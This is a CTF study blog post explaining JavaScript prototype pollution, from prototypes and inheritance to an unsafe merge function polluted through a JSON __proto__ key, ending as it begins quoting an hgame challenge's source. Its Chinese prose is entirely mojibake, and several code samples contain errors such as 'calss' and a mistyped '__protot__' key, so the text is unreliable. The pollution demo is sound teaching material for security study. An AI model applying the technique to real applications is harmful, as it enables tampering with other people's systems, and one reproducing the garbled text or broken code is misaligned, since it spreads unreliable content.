ä¸ºæ˜å¤©å°±æ˜¯hgameäº†æ‰€æœ‰æˆ‘æƒ³ç€åˆ·ç‚¹hgameçš„å†…å®¹ï¼Œç»“æœæ‰¾ä¸åˆ°å¤ç°å¹³å°ï¼Œåªåœ¨NSSä¸Šæ‰¾åˆ°ä¸€äº›ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯æˆ‘åœ¨å†™week4çš„Shared Diary Antel0p3æ—¶é‡åˆ°äº†åŸå‹é“¾æ±¡æŸ“ï¼Œä¸€ç‚¹éƒ½ä¸ä¼šæ‰€ä»¥æˆ‘å°±æ‰“ç®—å­¦ä¹ ä¸€ä¸‹JavaScriptçš„åŸå‹é“¾æ±¡æŸ“ã€‚"></a>å†™è¿™ç¯‡æ–‡ç« çš„åŸå› æ˜¯æˆ‘åœ¨æ”¾å¯’å‡ç»è¿‡äº†é•¿ä¹…çš„æ‘†çƒ‚åç—›å®šæ€ç—›ä¸èƒ½å†è¿™ä¹ˆä¸‹å»äº†ï¼Œå› ä¸ºæ˜å¤©å°±æ˜¯hgameäº†æ‰€æœ‰æˆ‘æƒ³ç€åˆ·ç‚¹hgameçš„å†…å®¹ï¼Œç»“æœæ‰¾ä¸åˆ°å¤ç°å¹³å°ï¼Œåªåœ¨NSSä¸Šæ‰¾åˆ°ä¸€äº›ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯æˆ‘åœ¨å†™week4çš„Shared Diary Antel0p3æ—¶é‡åˆ°äº†åŸå‹é“¾æ±¡æŸ“ï¼Œä¸€ç‚¹éƒ½ä¸ä¼šæ‰€ä»¥æˆ‘å°±æ‰“ç®—å­¦ä¹ ä¸€ä¸‹JavaScriptçš„åŸå‹é“¾æ±¡æŸ“ã€‚</h1><h1 id="åŸå‹é“¾æ±¡æŸ“çš„å‰ç½®çŸ¥è¯†"><a href="#åŸå‹é“¾æ±¡æŸ“çš„å‰ç½®çŸ¥è¯†" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“çš„å‰ç½®çŸ¥è¯†"></a>åŸå‹é“¾æ±¡æŸ“çš„å‰ç½®çŸ¥è¯†</h1><h2 id="jsçš„å¯¹è±¡"><a href="#jsçš„å¯¹è±¡" class="headerlink" title="jsçš„å¯¹è±¡"></a>jsçš„å¯¹è±¡</h2><h3 id="å¯¹è±¡åˆ›å»ºçš„å‡ ç§æ–¹å¼"><a href="#å¯¹è±¡åˆ›å»ºçš„å‡ ç§æ–¹å¼" class="headerlink" title="å¯¹è±¡åˆ›å»ºçš„å‡ ç§æ–¹å¼"></a>å¯¹è±¡åˆ›å»ºçš„å‡ ç§æ–¹å¼</h3><h4 id="1-é€šè¿‡å­—é¢é‡æ¨¡å¼åˆ›å»º"><a href="#1-é€šè¿‡å­—é¢é‡æ¨¡å¼åˆ›å»º" class="headerlink" title="1.é€šè¿‡å­—é¢é‡æ¨¡å¼åˆ›å»º"></a>1.é€šè¿‡å­—é¢é‡æ¨¡å¼åˆ›å»º</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="attr">a</span>:<span class="string">&quot;aa&quot;</span>,b=<span class="string">&quot;cc&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="2-é€šè¿‡ç±»æ¥è¿›è¡Œåˆ›å»º"><a href="#2-é€šè¿‡ç±»æ¥è¿›è¡Œåˆ›å»º" class="headerlink" title="2.é€šè¿‡ç±»æ¥è¿›è¡Œåˆ›å»º"></a>2.é€šè¿‡ç±»æ¥è¿›è¡Œåˆ›å»º</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">calss a&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b=<span class="keyword">new</span> <span class="title function_">a</span>(lss,<span class="number">18</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç±»æ¥åˆ›å»ºå¯¹è±¡ï¼Œ<code>constructor()</code>æ˜¯è‡ªå¸¦çš„å‡½æ•°ã€‚</p><h4 id="3-é€šè¿‡æ„é€ å‡½æ•°æ¥è¿›è¡Œåˆ›å»ºå¯¹è±¡"><a href="#3-é€šè¿‡æ„é€ å‡½æ•°æ¥è¿›è¡Œåˆ›å»ºå¯¹è±¡" class="headerlink" title="3.é€šè¿‡æ„é€ å‡½æ•°æ¥è¿›è¡Œåˆ›å»ºå¯¹è±¡"></a>3.é€šè¿‡æ„é€ å‡½æ•°æ¥è¿›è¡Œåˆ›å»ºå¯¹è±¡</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span>=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Add</span>()</span><br></pre></td></tr></table></figure><p>æ³¨æ„éœ€è¦åœ¨æ„é€ å‡½æ•°çš„å±æ€§å‰åŠ this.<br>åœ¨æ—©æœŸç‰ˆæœ¬çš„JavaScripté‡Œæ˜¯æ²¡æœ‰classå…³é”®è¯çš„ï¼Œæ‰€ä»¥æ„é€ å‡½æ•°æ³•çš„å‡½æ•°æˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸ºç±»ã€‚</p><h2 id="protoå’Œprototypeï¼Œconstructor"><a href="#protoå’Œprototypeï¼Œconstructor" class="headerlink" title="protoå’Œprototypeï¼Œconstructor"></a><strong>proto</strong>å’Œprototypeï¼Œconstructor</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“ç±»é‡Œä¸€èˆ¬éƒ½æ˜¯ç”±å®šä¹‰å‡½æ•°çš„å¦‚ä¸‹<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span>=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">aler</span>=<span class="keyword">function</span> <span class="title function_">lss</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;lll&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Add</span>()</span><br></pre></td></tr></table></figure><br>å½“æˆ‘ä»¬å°†æ„é€ å‡½æ•°å®ä¾‹åŒ–æˆå¤šä¸ªå¯¹è±¡æ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å…¶ä¼šé‡å¤çš„å®ä¾‹ç±»é‡Œçš„å‡½æ•°ï¼Œè¿™å›é€ æˆä¸å¿…è¦çš„å†…å­˜å ç”¨ï¼Œè¿™æ—¶å€™å°±éœ€è¦åŸå‹ï¼ˆprototypeï¼‰çš„å‡ºåœºäº†ã€‚<br>æˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹prototypeæ˜¯ç±»Addçš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨Addç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚<br>å¦‚ä¸‹<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span>=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Add</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">aler</span>=<span class="keyword">function</span> <span class="title function_">lss</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;lll&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Add</span>()</span><br><span class="line">a.<span class="title function_">aler</span>()</span><br></pre></td></tr></table></figure><br>å½“å¯¹è±¡åœ¨è‡ªå·±çš„å±æ€§é‡Œæ‰¾ä¸åˆ°è¯¥æ–¹æ³•æ—¶ï¼Œä»–å›å‘åŸå‹é‡Œæ‰¾ï¼Œå¦‚æœåŸå‹æ‰¾ä¸åˆ°å°±ä»åŸå‹çš„åŸå‹é‡Œæ‰¾ã€‚<br>è¿™æ ·åœ¨æˆ‘ä»¬åˆ›å»ºäº†è¿™ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åŸå‹æ¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Add.prototype</code>æ¥è®¿é—®ç±»Addçš„åŸå‹ï¼Œä½†æ˜¯å½“æŠŠç±»å®ä¾‹åŒ–æˆå¯¹è±¡æ—¶å°±ä¸èƒ½é€šè¿‡<code>prototype</code>æ¥å¯¹å…¶å®åŸå‹è¿›è¡Œè®¿é—®åˆ™æˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>__proto__</code>ä¹Ÿå°±æ˜¯<code>Add.prototype==a.__proto__</code><br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.png" class="" title="Alt text"></p><p>å®ä¾‹åŒ–åçš„å¯¹è±¡å­˜åœ¨ä¸€ä¸ªå±æ€§ä¸ºconstructorï¼Œè¯¥å±æ€§æŒ‡å‘äº†è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ä¹Ÿå°±æ˜¯ç±»ï¼Œå³<code>a.constructor==Add</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span>=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Add</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">constructor</span>)</span><br><span class="line">a.<span class="property">constructor</span>==<span class="title class_">Add</span></span><br></pre></td></tr></table></figure><br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png" class="" title="Alt text"></p><p>å‡½æ•°æˆ–è€…è¯´ç±»çš„åŸå‹æ˜¯é€šè¿‡prototypeæ¥å¯»æ‰¾æ‰¾åˆ°ã€‚<br>å®ä¾‹åŒ–åçš„å¯¹è±¡æ˜¯é€šè¿‡<strong>proto</strong>æ¥æŒ‡å‘åŸå‹çš„ã€‚ä¹Ÿå°±æ˜¯æŒ‡å‘å¯¹è±¡ç±»çš„prototypeå±æ€§ã€‚</p><h1 id="javascriptçš„åŸå‹é“¾ç»§æ‰¿"><a href="#javascriptçš„åŸå‹é“¾ç»§æ‰¿" class="headerlink" title="javascriptçš„åŸå‹é“¾ç»§æ‰¿"></a>javascriptçš„åŸå‹é“¾ç»§æ‰¿</h1><p>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚<br>å¦‚:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;lll&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;sss&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;eee&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><br>ä¸Šè¿°ä»£ç å°†ç±»Sonçš„åŸå‹èµ‹å€¼ä¸€ä¸ª<code>new Father</code>ï¼Œè¿™ä½¿<code>Son</code>çš„åŸå‹æœ‰äº†<code>Father</code>çš„å±æ€§ï¼Œå½“æˆ‘ä»¬è¾“å‡ºæ‰¾<code>son.first_name</code>æ—¶ä¼šè¾“å‡º <code>eee</code>è¿™æ˜¯å› ä¸ºè°ƒç”¨sonçš„first_nameæ˜¯ä¼šå…ˆæŸ¥æ‰¾soné‡Œæœ‰æ— ï¼Œæ²¡æœ‰æ‰ä¼šä»å…¶åŸå‹ä¸­æŸ¥æ‰¾ã€‚<br>æ‰€ä»¥å½“æˆ‘ä»¬æŸ¥æ‰¾<code>son.last_name</code>ä¼šè¿”å›<code>sss</code>è¿™æ˜¯å› ä¸ºsonç±»é‡Œæ²¡æœ‰åªèƒ½ä»å…¶åŸå‹ä¸­æŸ¥æ‰¾ã€‚</p><p>å°æ€»ç»“ï¼š<br>1.æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)<br>2.å¯¹è±¡çš„<strong>proto</strong>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡prototype<br>3.JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</p><h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h1><h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“ä»€ä¹ˆæ˜¯åŸå‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹ï¼Œæœ‰å¤šä¸ªç±»å…¶åŸå‹ï¼ˆæŠŠåŸå‹æƒ³åƒæˆçˆ¶ç±»ï¼‰ç›¸åŒï¼Œè€Œç»å¤§å¤šæ•°çš„å¯¹è±¡å…¶åŸå‹æœ€ç»ˆéƒ½æŒ‡å‘Object.prototypeï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†å¤§å¤šæ•°çš„å¯¹è±¡éƒ½å¯ä»¥ç»§æ‰¿Object.prototypeçš„æ–¹æ³•å’Œå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœèƒ½å°†ä¸€ä¸ªå¯¹è±¡åŸå‹è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ—¶å€™å°±æœ‰å¯èƒ½ä¼šå½±å“åˆ°å…¶ä»–å¯¹è±¡ï¼Œå› ä¸ºä¸¤ä¸ªå¯¹è±¡çš„åŸå‹æœ‰å¯èƒ½ä¸ºåŒä¸€ä¸ªã€‚æˆ‘ä»¬å¯ä»¥åšä¸ªå°å®éªŒ<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="attr">num</span>:<span class="number">1</span>,<span class="attr">name</span>:<span class="string">&quot;lssee&quot;</span>&#125;<span class="comment">//åˆ›å»ºå¯¹è±¡a</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;&#125;<span class="comment">//åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡</span></span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">num</span>=<span class="number">9999</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">num</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">num</span>)</span><br></pre></td></tr></table></figure><br>åƒä¸Šè¿°ä»£ç ä¸­ï¼Œ<code>a.num</code>è¿”å›1,<code>b.num</code>è¿”å›9999è¿™æ˜¯å› ä¸ºaä¸bçš„åŸå‹éƒ½æ˜¯Object.getPrototypeã€‚é‚£ä¹ˆå°±açš„åŸå‹ä¿®æ”¹å°±æ˜¯å°†bçš„åŸå‹ä¿®æ”¹ï¼Œé‚£ä¹ˆè¿™æ—¶å€™bé‡Œæ‰¾numæ‰¾ä¸åˆ°å°±ä¼šåŒºåŸå‹ä¸­å¯»æ‰¾ã€‚</p><p>åœ¨ä¸€ä¸ªwebä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</p><h1 id="åŸå‹é“¾æ±¡æŸ“çš„æƒ…å†µ"><a href="#åŸå‹é“¾æ±¡æŸ“çš„æƒ…å†µ" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“çš„æƒ…å†µ"></a>åŸå‹é“¾æ±¡æŸ“çš„æƒ…å†µ</h1><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ<strong>proto</strong>çœ‹æˆä¸€ä¸ªå¯¹è±¡çš„é”®å(ä¹Ÿå°±æ˜¯å±æ€§å)å…¶é”®å€¼å°±æ˜¯åŸå‹ï¼Œé‚£ä¹ˆåªè¦å‡ºç°æˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¸€ä¸ªå¯¹è±¡çš„é”®åçš„æƒ…å†µå³å¯ï¼Œæˆ‘ä»¬å¯ä»¥å°†<strong>protot</strong>å½“æˆé”®å€¼ä¼ å…¥ã€‚<br>å‡ºç°è¿™ç§æƒ…å†µçš„åŸå› ä¸»è¦å¦‚ä¸‹ã€‚<br>å¯¹è±¡merge<br>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰<br>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¸Šè¿°ä»£ç åœ¨å°†ä¸¤ä¸ªå¯¹è±¡åˆå¹¶çš„è¿‡ç¨‹ä¸­å­˜åœ¨ <code>target[key] = source[key]</code>åœ¨è¿™ä¸ªèµ‹å€¼è¿‡ç¨‹ä¸­å¦‚æœkeyä¸º<strong>protot</strong>é‚£ä¹ˆå°±ä¼šäº§ç”Ÿæ±¡æŸ“ã€‚<br>æˆ‘ä»¬åšä¸ªå®éªŒè¯•è¯•<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a=&#123;<span class="attr">num</span>:<span class="string">&quot;lll&quot;</span>,<span class="string">&quot;__protot__&quot;</span>:&#123;<span class="attr">b</span>:<span class="string">&quot;bbb&quot;</span>&#125;&#125;</span><br><span class="line"><span class="keyword">var</span> b=&#123;&#125;</span><br><span class="line"><span class="title function_">merge</span>(b, a)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">num</span>,a.<span class="property">b</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.png" class="" title="Alt text"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°bå€¼å¹¶æ²¡æœ‰è¢«æ’å…¥åˆ°aå’Œbçš„åŸå‹é‡Œï¼Œè¿™æ˜¯å› ä¸ºjavascriptåœ¨åˆ›å»ºå¯¹è±¡aæ—¶ä¼šç›´æ¥å°†<code>__proto__</code>å½“æˆå…¶åŸå‹ï¼Œè€Œä¸æ˜¯é”®å€¼ï¼Œå¯¼è‡´açš„é”®å€¼è¢«è§£æä¸º<code>num</code>å’Œ<code>b</code>é‚£ä¹ˆå°±ä¼šå¯¼è‡´è¿™å¥ä»£ç <code>target[key] = source[key]</code>ä¸ä¼šä¿®æ”¹aå’Œbçš„åŸå‹ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥è¿™ä¹ˆæ‰èƒ½å°†<strong>proto</strong>å½“æˆé”®å€¼å‘¢?å¾ˆç®€å•åªè¦å°†å¯¹è±¡ä»¥jsonçš„æ ¼å¼å†™å…¥ï¼Œå½“ä»¥jsonçš„æ ¼å¼å†™å…¥æ—¶å°±ä¼šå°†<strong>proto</strong>è§£æä¸ºé”®å€¼ã€‚<br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.png" class="" title="Alt text"><br>æˆ‘ä»¬çœ‹ä¸Šå›¾å¯ä»¥å‘ç°å°†å¯¹è±¡ä»¥jsonå½¢å¼ä¼ å…¥å‡½æ•°ï¼Œå‡½æ•°å°†<strong>proto</strong>å½“æˆäº†é”®æˆåŠŸä¿®æ”¹äº†åŸå‹çš„å€¼ï¼Œæ—¶å¾—b.bä¸ä¸ºæœªå®šä¹‰,ä¸ºbbbã€‚<br>è¿™è¯´æ˜äº†åŸå‹é“¾è¢«æ±¡æŸ“ã€‚</p><h1 id="å®ä¾‹ï¼Œhgame-week-4-Shared-Diary-Antel0p3"><a href="#å®ä¾‹ï¼Œhgame-week-4-Shared-Diary-Antel0p3" class="headerlink" title="å®ä¾‹ï¼Œhgame week 4 Shared Diary Antel0p3"></a>å®ä¾‹ï¼Œhgame week 4 Shared Diary Antel0p3</h1><p>è¿™é¢˜æˆ‘ä»¬ç™»é™†è¿›å»å‘ç°æ˜¯ä¸€ä¸ªç™»é™†æ¡†ï¼Œé¢˜ç›®å†™äº†è¿™ä¸ªæ˜¯ç”¨jsè¿›è¡Œç¼–å†™çš„ç™»é™†æ¡†ï¼Œæˆ‘ä»¬ä¸‹è½½æºç ã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span 